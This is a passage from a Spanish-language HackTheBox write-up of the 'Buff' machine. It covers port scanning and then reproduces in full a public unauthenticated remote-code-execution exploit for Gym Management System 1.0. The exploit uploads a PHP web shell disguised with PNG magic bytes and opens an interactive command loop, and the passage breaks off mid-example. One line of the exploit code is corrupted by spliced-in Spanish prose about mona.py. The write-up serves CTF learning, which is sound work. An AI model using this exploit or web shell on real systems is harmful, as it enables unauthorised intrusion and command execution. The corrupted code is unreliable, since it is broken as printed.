style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita/>Jabita</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/w140-video/>W140 (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/uvalde-video/>Uvalde (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-i-video/>Friendly I (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/jabita-video/>Jabita (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/literal-video/>Literal (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/doc-video/>Doc (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/five-video/>Five (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-ii-video/>Friendly II (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/visions-video/>Visions (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/friendly-iii-video/>Friendly III (Video)</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=false>
VulnHub</button><div class=collapse id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#puerto-8080>Puerto 8080</a></li></ul></li><li><a href=#intrusión>Intrusión</a></li><li><a href=#analizando-la-vulnerabilidad>Analizando la vulnerabilidad</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><ul><li><a href=#buffer-overflow>Buffer Overflow</a><ul><li><a href=#portfordwarding>Portfordwarding</a></li><li><a href=#calcular-offset>Calcular Offset</a></li><li><a href=#badchars>Badchars</a></li><li><a href=#protecciones>Protecciones</a></li><li><a href=#jmp-esp>JMP ESP</a></li><li><a href=#shellcode>ShellCode</a></li><li><a href=#script-final>Script final</a></li></ul></li></ul></li></ul></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/hackthebox/>HackTheBox</a></li><li class="breadcrumb-item active" aria-current=page>Buff</li></ol></nav><div style=display:flex;align-items:center><div style="border-left:8px solid #4ca113;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>Buff</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#puerto-8080>Puerto 8080</a></li></ul></li><li><a href=#intrusión>Intrusión</a></li><li><a href=#analizando-la-vulnerabilidad>Analizando la vulnerabilidad</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a><ul><li><ul><li><a href=#buffer-overflow>Buffer Overflow</a><ul><li><a href=#portfordwarding>Portfordwarding</a></li><li><a href=#calcular-offset>Calcular Offset</a></li><li><a href=#badchars>Badchars</a></li><li><a href=#protecciones>Protecciones</a></li><li><a href=#jmp-esp>JMP ESP</a></li><li><a href=#shellcode>ShellCode</a></li><li><a href=#script-final>Script final</a></li></ul></li></ul></li></ul></li></ul></li></ul></nav></div></details></nav><div class=tag-list-single><a class="btn btn-light" href=/tags/ctf/ role=button>CTF</a>
<a class="btn btn-light" href=/tags/bof/ role=button>BoF</a>
<a class="btn btn-light" href=/tags/file-upload/ role=button>File Upload</a>
<a class="btn btn-light" href=/tags/portfordwarding/ role=button>Portfordwarding</a></div><div style=display:flex;align-items:center;vertical-align:middle><img src=/blog/phishing/images/win.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/blog/phishing/images/htb.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><br><p>Es una máquina muy simple, pero vamos a analizar en profundidad un Buffer Overflow de CloudMe 1.11.2 y un 'Unauthenticated Remote Code Execution' en 'Gym Management System 1.0'</p><p><small>March 18, 2024<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>21&nbsp;minutes</span></small></p><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; ping -c <span class=m>1</span> 10.10.10.198
</span></span><span class=line><span class=cl>PING 10.10.10.198 <span class=o>(</span>10.10.10.198<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.10.198: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span><span class=m>304</span> ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.10.198 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 303.579/303.579/303.579/0.000 ms
</span></span></code></pre></div><p>Tenemos conexión y en este caso da un ttl (time to live) de <strong>127</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Windows</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.198 -oG allPorts
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobación de sí la máquina está activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>&gt; extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.198
   5   │     [*] Open ports: 8080
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sCV -p8080 10.10.10.198 -Pn -oN versions
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-03 12:58 CET
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.198
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.39s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>8080/tcp open  http    Apache httpd 2.4.43 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1g PHP/7.4.6<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: mrb3n<span class=err>&#39;</span>s Bro Hut
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.43 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1g PHP/7.4.6
</span></span><span class=line><span class=cl><span class=p>|</span> http-open-proxy: Potentially OPEN proxy.
</span></span><span class=line><span class=cl><span class=p>|</span>_Methods supported:CONNECTION
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table></details><h3 id=puerto-8080>Puerto 8080<a href=#puerto-8080 class=anchor aria-hidden=true>#</a></h3><p>Nmap ha reportado que el puerto 8080 está abierto con una web hecha en Apache 2.4.42.</p><p>Al entrar vemos una web simple sobre un gimnasio, si vamos al apartado de contacto vemos el siguiente mensaje.</p><blockquote><p>Made using Gym Management Software 1.0</p></blockquote><h2 id=intrusión>Intrusión<a href=#intrusión class=anchor aria-hidden=true>#</a></h2><p>Con una búsqueda en exploit-db vemos que es vulnerable a un RCE sin necesidad de estar autenticados</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; searchsploit gym
</span></span><span class=line><span class=cl>-------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                      <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>-------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Gym Management System 1.0 - <span class=s1>&#39;id&#39;</span> SQL Injection                      <span class=p>|</span> php/webapps/48936.txt
</span></span><span class=line><span class=cl>Gym Management System 1.0 - Authentication Bypass                   <span class=p>|</span> php/webapps/48940.txt
</span></span><span class=line><span class=cl>Gym Management System 1.0 - Stored Cross Site Scripting             <span class=p>|</span> php/webapps/48941.txt
</span></span><span class=line><span class=cl>Gym Management System 1.0 - Unauthenticated Remote Code Execution   <span class=p>|</span> php/webapps/48506.py
</span></span><span class=line><span class=cl>GYM MS - GYM Management System - Cross Site Scripting <span class=o>(</span>Stored<span class=o>)</span>      <span class=p>|</span> php/webapps/51777.txt
</span></span><span class=line><span class=cl>WordPress Plugin WPGYM - SQL Injection                              <span class=p>|</span> php/webapps/42801.txt
</span></span><span class=line><span class=cl>-------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>Lo copiamos al directorio actual de trabajo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; searchsploit -m php/webapps/48506.py
</span></span><span class=line><span class=cl>  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/48506
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
</span></span><span class=line><span class=cl>    Codes: N/A
</span></span><span class=line><span class=cl> Verified: False
</span></span><span class=line><span class=cl>File Type: Python script, ASCII text executable
</span></span><span class=line><span class=cl>cp: overwrite <span class=s1>&#39;/home/d3b0o/Desktop/buff/48506.py&#39;</span>? y
</span></span><span class=line><span class=cl>Copied to: /home/d3b0o/Desktop/buff/48506.py
</span></span></code></pre></div><p>Este sería el exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span><span class=o>,</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>urllib</span><span class=o>,</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>colorama</span> <span class=kn>import</span> <span class=n>Fore</span><span class=p>,</span> <span class=n>Back</span><span class=p>,</span> <span class=n>Style</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>packages</span><span class=o>.</span><span class=n>urllib3</span><span class=o>.</span><span class=n>disable_warnings</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>packages</span><span class=o>.</span><span class=n>urllib3</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>InsecureRequestWarning</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>webshell</span><span class=p>(</span><span class=n>SERVER_URL</span><span class=p>,</span> <span class=n>session</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>WEB_SHELL</span> <span class=o>=</span> <span class=n>SERVER_URL</span><span class=o>+</span><span class=s1>&#39;upload/kamehameha.php&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>getdir</span>  <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;telepathy&#39;</span><span class=p>:</span> <span class=s1>&#39;echo %CD%&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>r2</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>WEB_SHELL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>getdir</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>status</span> <span class=o>=</span> <span class=n>r2</span><span class=o>.</span><span class=n>status_code</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>status</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span> <span class=n>Style</span><span class=o>.</span><span class=n>BRIGHT</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RED</span><span class=o>+</span><span class=s2>&#34;[!] &#34;</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RESET</span><span class=o>+</span><span class=s2>&#34;Could not connect to the webshell.&#34;</span><span class=o>+</span><span class=n>Style</span><span class=o>.</span><span class=n>RESET_ALL</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>Fore</span><span class=o>.</span><span class=n>GREEN</span><span class=o>+</span><span class=s1>&#39;[+] &#39;</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RESET</span><span class=o>+</span><span class=s1>&#39;Successfully connected to webshell.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cwd</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;[CDEF].*&#39;</span><span class=p>,</span> <span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cwd</span> <span class=o>=</span> <span class=n>cwd</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;&gt; &#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>term</span> <span class=o>=</span> <span class=n>Style</span><span class=o>.</span><span class=n>BRIGHT</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>GREEN</span><span class=o>+</span><span class=n>cwd</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RESET</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>thought</span> <span class=o>=</span> <span class=n>raw_input</span><span class=p>(</span><span class=n>term</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>command</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;telepathy&#39;</span><span class=p>:</span> <span class=n>thought</span><span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>r2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>WEB_SHELL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>command</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>status</span> <span class=o>=</span> <span class=n>r2</span><span class=o>.</span><span class=n>status_code</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>status</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>r2</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>response2</span> <span class=o>=</span> <span class=n>r2</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>response2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>Exiting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>formatHelp</span><span class=p>(</span><span class=n>STRING</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>Style</span><span class=o>.</span><span class=n>BRIGHT</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RED</span><span class=o>+</span><span class=n>STRING</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RESET</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>header</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>BL</span>   <span class=o>=</span> <span class=n>Style</span><span class=o>.</span><span class=n>BRIGHT</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>GREEN</span>
</span></span><span class=line><span class=cl>    <span class=n>RS</span>   <span class=o>=</span> <span class=n>Style</span><span class=o>.</span><span class=n>RESET_ALLomo</span> <span class=n>instalar</span> <span class=n>mona</span><span class=o>.</span><span class=n>py</span> <span class=n>en</span> <span class=n>Immunity</span> <span class=n>Debugger</span>
</span></span><span class=line><span class=cl>    <span class=n>FR</span>   <span class=o>=</span> <span class=n>Fore</span><span class=o>.</span><span class=n>RESET</span>
</span></span><span class=line><span class=cl>    <span class=n>SIG</span>  <span class=o>=</span> <span class=n>BL</span><span class=o>+</span><span class=s1>&#39;            /</span><span class=se>\\\n</span><span class=s1>&#39;</span><span class=o>+</span><span class=n>RS</span>
</span></span><span class=line><span class=cl>    <span class=n>SIG</span> <span class=o>+=</span> <span class=n>Fore</span><span class=o>.</span><span class=n>YELLOW</span><span class=o>+</span><span class=s1>&#39;/vvvvvvvvvvvv &#39;</span><span class=o>+</span><span class=n>BL</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span><span class=o>+</span><span class=n>FR</span><span class=o>+</span><span class=s1>&#39;--------------------------------------,</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>SIG</span> <span class=o>+=</span> <span class=n>Fore</span><span class=o>.</span><span class=n>YELLOW</span><span class=o>+</span><span class=s1>&#39;`^^^^^^^^^^^^&#39;</span><span class=o>+</span><span class=n>BL</span><span class=o>+</span><span class=s1>&#39; /&#39;</span><span class=o>+</span><span class=n>FR</span><span class=o>+</span><span class=s1>&#39;============&#39;</span><span class=o>+</span><span class=n>Fore</span><span class=o>.</span><span class=n>RED</span><span class=o>+</span><span class=s1>&#39;BOKU&#39;</span><span class=o>+</span><span class=n>FR</span><span class=o>+</span><span class=s1>&#39;=====================&#34;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>SIG</span> <span class=o>+=</span> <span class=n>BL</span><span class=o>+</span><span class=s1>&#39;            \/&#39;</span><span class=o>+</span><span class=n>RS</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>SIG</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>header</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=n>formatHelp</span><span class=p>(</span><span class=s2>&#34;(+) Usage:</span><span class=se>\t</span><span class=s2> python </span><span class=si>%s</span><span class=s2> &lt;WEBAPP_URL&gt;&#34;</span> <span class=o>%</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=n>formatHelp</span><span class=p>(</span><span class=s2>&#34;(+) Example:</span><span class=se>\t</span><span class=s2> python </span><span class=si>%s</span><span class=s2> &#39;https://10.0.0.3:443/gym/&#39;&#34;</span> <span class=o>%</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>SERVER_URL</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>UPLOAD_DIR</span> <span class=o>=</span> <span class=s1>&#39;upload.php?id=kamehameha&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>UPLOAD_URL</span> <span class=o>=</span> <span class=n>SERVER_URL</span> <span class=o>+</span> <span class=n>UPLOAD_DIR</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>SERVER_URL</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>PNG_magicBytes</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\x89\x50\x4e\x47\x0d\x0a\x1a</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>png</span>     <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;file&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                  <span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;kaio-ken.php.png&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>PNG_magicBytes</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>+</span><span class=s1>&#39;&lt;?php echo shell_exec($_GET[&#34;telepathy&#34;]); ?&gt;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;image/png&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span><span class=s1>&#39;Content-Disposition&#39;</span><span class=p>:</span> <span class=s1>&#39;form-data&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>                  <span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>fdata</span>   <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;pupload&#39;</span><span class=p>:</span> <span class=s1>&#39;upload&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r1</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>UPLOAD_URL</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>png</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>fdata</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>webshell</span><span class=p>(</span><span class=n>SERVER_URL</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>                  
</span></span></code></pre></div><p>Básicamente, lo que hace es subir un archivo el cual lo llama <code>kaio-ken.php.png</code> en el /upload.php. Dentro del archivo le mete los <strong>magic bytes de PNG</strong> para que se piense que el contenido es un png (x89\x50\x4e\x47\x0d\x0a\x1a). A continuación hay un ejemplo de como usar esta técnica para hacer que un script de php se piense que es un GIF</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; cat test.php
</span></span><span class=line><span class=cl>───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>       │ File: test.php
</span></span><span class=line><span class=cl>───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>   <span class=m>1</span>   │ &lt;?php
</span></span><span class=line><span class=cl>   <span class=m>2</span>   │ <span class=nb>echo</span> <span class=s2>&#34;Test&#34;</span>
</span></span><span class=line><span class=cl>   <span class=m>3</span>   │ ?&gt;
</span></span><span class=line><span class=cl>───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>                                                                                                               
</span></span><span class=line><span class=cl>&gt; file test.php
</span></span><span class=line><span class=cl>test.php: PHP script, ASCII text
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; cat test.php
</span></span><span class=line><span class=cl>───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>       │ File: test.php
</span></span><span class=line><span class=cl>───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>   <span class=m>1</span>   │ GIF8<span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=m>2</span>   │ &lt;?php
